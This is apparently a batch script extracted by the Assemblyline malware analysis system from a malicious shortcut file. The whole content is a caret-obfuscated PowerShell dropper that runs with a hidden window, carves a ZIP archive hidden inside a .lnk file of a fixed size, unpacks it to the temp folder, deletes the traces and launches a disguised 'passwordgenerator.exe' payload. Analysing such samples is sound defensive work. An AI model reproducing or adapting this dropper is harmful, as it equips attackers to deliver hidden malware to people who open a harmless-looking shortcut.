REM Batch extracted by Assemblyline
po^wersh^ell -windowstyle hidden $obf_lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 00824235} ^| Select-Object -ExpandProperty FullName;$obf_file = [system.io.file]::ReadAllBytes($obf_lnkpath);$obf_path = '%TEMP%\tmp.zip';$obf_path = [Environment]::ExpandEnvironmentVariables($obf_path);$obf_dir = [System.IO.Path]::GetDirectoryName($obf_path);[System.IO.File]::WriteAllBytes($obf_path, $obf_file[008192..($obf_file.length)]);cd $obf_dir;Expand-Archive -Path $obf_path -DestinationPath . -EA SilentlyContinue -Force ^| Out-Null;Remove-Item -Path $obf_path -EA SilentlyContinue -Force ^| Out-Null;^& .\passwordgenerator.exe